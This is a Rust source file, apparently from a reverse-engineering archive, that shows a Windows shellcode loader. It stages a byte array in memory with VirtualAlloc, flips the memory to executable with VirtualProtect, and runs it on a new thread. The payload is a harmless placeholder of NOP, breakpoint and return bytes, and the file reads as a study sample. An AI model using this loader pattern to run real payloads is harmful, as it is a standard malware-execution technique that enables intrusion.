/*
    Shellcode Loader
    Archive of Reversing.ID

    Storing payload in stack.

Compile:
    $ cargo build

Technique:
    - allocation: VirtualAlloc
    - writing:    
    - permission: 
    - execution:  unsafe call to function pointer
*/

use std::{mem, process, ptr};
use winapi::um::{
    errhandlingapi::GetLastError,
    memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect},
    minwinbase::LPTHREAD_START_ROUTINE,
    processthreadsapi::CreateThread,
    synchapi::WaitForSingleObject,
    winbase::INFINITE,
    winnt::{
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, 
        PAGE_READWRITE, PAGE_EXECUTE_READ
    },
};

type DWORD = u32;

fn main() {
    // shellcode storage in stack
    let payload: [u8; 4] = [0x90, 0x90, 0xCC, 0xC3];
    let mut old_protect: DWORD = PAGE_READWRITE;

    unsafe {
        // allocate memory buffer for payload as READ-WRITE (no executable)
        let runtime = VirtualAlloc(
            ptr::null_mut(),
            payload.len().try_into().unwrap(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if runtime.is_null() {
            println!("[-] unable to allocate");
            process::exit(1);
        }

        // copy payload to the buffer
        std::ptr::copy(payload.as_ptr(), runtime.cast(), payload.len());

        // make buffer executable (R-X)
        let retval = VirtualProtect (
            runtime,
            payload.len() as usize,
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if retval != 0 {
            let mut tid = 0;
            let ep: LPTHREAD_START_ROUTINE = mem::transmute(runtime);

            // run the shellcode on new thread
            let th_shellcode = 
                CreateThread (ptr::null_mut(), 0, ep, ptr::null_mut(), 0, &mut tid);

            // wait until thread exit gracefully, if not print the error
            if WaitForSingleObject(th_shellcode, INFINITE) != 0 {
                let error = GetLastError();
                println!("Error: {}", error.to_string());
            }
        }

        VirtualFree(runtime, payload.len(), MEM_RELEASE);
    }
}